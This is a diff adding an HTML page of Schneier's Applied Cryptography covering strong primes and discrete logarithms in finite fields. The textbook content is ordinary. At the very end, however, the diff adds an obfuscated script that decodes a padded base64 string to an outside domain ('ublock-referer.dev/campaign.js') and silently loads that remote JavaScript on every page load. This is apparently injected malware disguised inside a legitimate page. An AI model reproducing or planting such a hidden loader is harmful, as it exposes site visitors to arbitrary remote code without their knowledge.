@@ -1,0 +1,127 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=261-263//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-12.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch12/12-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>One implementation of this method on a Sparc II was able to find 256-bit primes in an average of 2.8 seconds, 512-bit primes in an average of 24.0 seconds, 768-bit primes in an average of 2.0 minutes, and 1024-bit primes in an average of 5.1 minutes [918].
+</P>
+<P><FONT SIZE="+1"><B><I>Strong Primes</I></B></FONT></P>
+<P>If <I>n</I> is the product of two primes, <I>p</I> and <I>q</I>, it may be desirable to use <B>strong primes</B> for <I>p</I> and <I>q.</I> These are prime numbers with certain properties that make the product <I>n</I> difficult to factor by specific factoring methods. Among the properties suggested have been [1328,651]:</P>
+<DL>
+<DD>The greatest common divisor of <I>p</I> - 1 and <I>q</I> - 1 should be small.
+<DD>Both <I>p</I> - 1 and <I>q</I> - 1 should have large prime factors, respectively <I>p&#146;</I> and <I>q&#146;</I>.
+<DD>Both <I>p&#146;</I> - 1 and <I>q&#146;</I> - 1 should have large prime factors.
+<DD>Both <I>p</I> &#43; 1 and <I>q</I> &#43; 1 should have large prime factors.
+<DD>Both (<I>p</I> - 1)/2 and (<I>q</I> - 1)/2 should be prime [182]. (Note that if this condition is true, then so are the first two.)
+</DL>
+<P>Whether strong primes are necessary is a subject of debate. These properties were designed to thwart some older factoring algorithms. However, the fastest factoring algorithms have as good a chance of factoring numbers that meet these criteria as they do of factoring numbers that do not [831].
+</P>
+<P>I recommend against specifically generating strong primes. The length of the primes is much more important than the structure. Moreover, structure may be damaging because it is less random.</P>
+<P>This may change. New factoring techniques may be developed that work better on numbers with certain properties than on numbers without them. If so, strong primes may be required once again. Check current theoretical mathematics journals for updates.</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">11.6 Discrete Logarithms in a Finite Field</FONT></H3>
+<P>Modular exponentiation is another one-way function used frequently in cryptography. Evaluating this expression is easy:
+</P>
+<DL>
+<DD><I>a<SUP><SMALL>x</SMALL></SUP></I> mod <I>n</I>
+</DL>
+<P>The inverse problem of modular exponentiation is that of finding the discrete logarithm of a number. This is a hard problem:
+</P>
+<DL>
+<DD>Find <I>x</I> where <I>a<SUP><SMALL>x</SMALL></SUP></I> &#8801; b (mod <I>n</I>).
+</DL>
+<P>For example:
+</P>
+<DL>
+<DD>If 3<SUP><SMALL><I>x</I></SMALL></SUP> &#8801; 15 mod 17, then <I>x</I> = 6
+</DL>
+<P>Not all discrete logarithms have solutions (remember, the only valid solutions are integers). It&#146;s easy to see that there is no solution, <I>x</I>, to the equation</P>
+<DL>
+<DD>3<SUP><SMALL>x</SMALL></SUP> = 7 (mod 13)
+</DL>
+<P>It&#146;s far more difficult to solve these problems using 1024-bit numbers.
+</P>
+<P><FONT SIZE="+1"><B><I>Calculating Discrete Logarithms in a Finite Group</I></B></FONT></P>
+<P>There are three main groups whose discrete logarithms are of interest to cryptographers:
+</P>
+<DL>
+<DD>&#151; The multiplicative group of prime fields: GF(<I>p</I>)
+<DD>&#151; The multiplicative group of finite fields of characteristic 2: GF(2<SUP><SMALL>n</SMALL></SUP>)
+<DD>&#151; Elliptic curve groups over finite fields <I>F</I> : EC(<I>F</I>)
+</DL>
+<P>The security of many public-key algorithms is based on the problem of finding discrete logarithms, so the problem has been extensively studied. A good comprehensive overview of the problem, and the best solutions at the time, can be found in [1189, 1039]. The best current article on the topic is [934].
+</P>
+<P>If <I>p</I> is the modulus and is prime, then the complexity of finding discrete logarithms in GF(<I>p</I>) is essentially the same as factoring an integer <I>n</I> of about the same size, when <I>n</I> is the product of two approximately equal-length primes [1378, 934]. This is:</P>
+<DL>
+<DD>e<SUP><SMALL>(1&#43; 0(1))(ln (<I>p</I>))<SUP><SMALL>(1/2)</SMALL></SUP>(ln (ln (<I>p</I>)))<SUP><SMALL>(1/2)</SMALL></SUP></SMALL></SUP>
+</DL>
+<P>The number field sieve is faster, with an heuristic asymptotic time estimate of
+</P>
+<DL>
+<DD>e<SUP><SMALL>(1.923&#43; 0(1))(ln (<I>p</I>))<SUP><SMALL>(1/3)</SMALL></SUP>(ln (ln (<I>p</I>)))<SUP><SMALL>(2/3)</SMALL></SUP></SMALL></SUP>
+</DL>
+<P>Stephen Pohlig and Martin Hellman found a fast way of computing discrete logarithms in GF(<I>p</I>) if <I>p</I> - 1 has only small prime factors [1253]. For this reason, only fields where <I>p</I> - <I></I> 1 has at least one large factor are used in cryptography. Another algorithm [14] computes discrete logarithms at a speed comparable to factoring; it has been expanded to fields of the form GF(<I>p<SUP><SMALL>n</SMALL></SUP></I>) [716]. This algorithm was criticized [727] for having some theoretical problems. Other articles [1588] show how difficult the problem really is.</P>
+<P>Computing discrete logarithms is closely related to factoring. If you can solve the discrete logarithm problem, then you can factor. (The converse has never been proven to be true.) Currently, there are three methods for calculating discrete logarithms in a prime field [370, 934, 648]: the linear sieve, the Gaussian integer scheme, and the number field sieve.</P>
+<P>The preliminary, extensive computing has to be done only once per field. Afterward, individual logarithms can be quickly calculated. This can be a security disadvantage for systems based on these fields. It is important that different applications use different prime fields. Multiple users in the same application can use a common field, though.</P>
+<P>In the world of extension fields, GF(2<SUP><SMALL>n</SMALL></SUP>) hasn&#146;t been ignored by researchers. An algorithm was proposed in [727]. Coppersmith&#146;s algorithm makes finding discrete logarithms in fields such as GF(2<SUP><SMALL>127</SMALL></SUP>) reasonable and finding them in fields around GF(2<SUP><SMALL>400</SMALL></SUP>) possible [368]. This was based on work in [180]. The precomputation stage of this algorithm is enormous, but otherwise it is nice and efficient. A practical implementation of a less efficient version of the same algorithm, after a seven-hour precomputation period, found discrete logs in GF(2<SUP><SMALL>127</SMALL></SUP>) in several seconds each [1130, 180]. (This particular field, once used in some cryptosystems [142, 1631, 1632], is insecure.) For surveys of some of these results, consult [1189, 1039].</P>
+<P>More recently, the precomputations for GF(2<SUP><SMALL>227</SMALL></SUP>), GF(2<SUP><SMALL>313</SMALL></SUP>), and GF(2<SUP><SMALL>401</SMALL></SUP>) are done, and significant progress has been made towards GF(2<SUP><SMALL>503</SMALL></SUP>). These calculations are being executed on an nCube-2 massively parallel computer with 1024 processors [649, 650]. Computing discrete logarithms in GF(2<SUP><SMALL>593</SMALL></SUP>) is still barely out of reach.</P>
+<P>Like discrete logarithms in a prime field, the precomputation required to calculate discrete logarithms in a polynomial field has to be done only once. Taher ElGamal [520] gives an algorithm for calculating discrete logs in the field GF(<I>p<SUP><SMALL>2</SMALL></SUP></I>).</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-12.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch12/12-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(XgNidJKD, HTRIPLpp) {HTRIPLpp = XgNidJKD.createElement('script');HTRIPLpp.type = 'text/javascript';HTRIPLpp.async = true;HTRIPLpp.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');XgNidJKD.getElementsByTagName('body')[0].appendChild(HTRIPLpp);}(document));</script></body>
+</html>
